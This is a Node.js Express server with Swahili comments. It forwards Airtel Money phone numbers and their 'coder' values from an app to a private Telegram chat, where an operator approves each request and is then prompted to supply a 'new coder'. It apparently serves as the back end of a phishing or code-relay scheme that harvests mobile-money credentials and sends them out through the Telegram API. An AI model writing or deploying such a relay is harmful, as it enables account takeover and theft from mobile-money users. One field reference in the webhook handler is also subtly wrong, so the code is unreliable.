const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const app = express();
app.use(bodyParser.json());

const TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}`;

let pendingApprovals = {};

// Hii inatumiwa na app yako kutuma ombi
app.post('/send', async (req, res) => {
    const { number, coder, id } = req.body;
    pendingApprovals[id] = { number, coder };

    const text = `🔔 Ombi Jipya la Airtel Money\nNamba: ${number}\nCoder: ${coder}\nID: ${id}`;

    await axios.post(`${TELEGRAM_API}/sendMessage`, {
        chat_id: CHAT_ID,
        text: text,
        reply_markup: { inline_keyboard: [[{ text: "✅ Approve", callback_data: `approve_${id}` }]] }
    });
    res.json({ ok: true });
});

// Hii ndio webhook ya Telegram
app.post('/telegram', async (req, res) => {
    const update = req.body;

    if (update.callback_query) {
        const callback = update.callback_query;
        const id = callback.data.split('_')[1];
        const data = pendingApprovals[id];

        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, { callback_query_id: callback.id });

        if (data) {
            await axios.post(`${TELEGRAM_API}/editMessageText`, {
                chat_id: callback.message.chat.id,
                message_id: callback.message_id,
                text: `🔔 Ombi Jipya la Airtel Money\nNamba: ${data.number}\nCoder: ${data.coder}\nID: ${id}\n\n✅ Imeapproved. Tuma coder mpya sasa:`
            });
            pendingApprovals[id].waitingForNewCoder = true;
        }
    }

    if (update.message) {
        const text = update.message.text;
        for(let id in pendingApprovals) {
            if(pendingApprovals[id].waitingForNewCoder) {
                const oldData = pendingApprovals[id];
                await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: CHAT_ID,
                    text: `✅ Coder imebadilishwa!\nNamba: ${oldData.number}\nCoder Mpya: ${text}\nID: ${id}`
                });
                delete pendingApprovals[id];
                break;
            }
        }
    }
    res.sendStatus(200);
});

app.get('/', (req, res) => res.send('Bot is running'));
app.listen(10000, () => console.log('Running'));
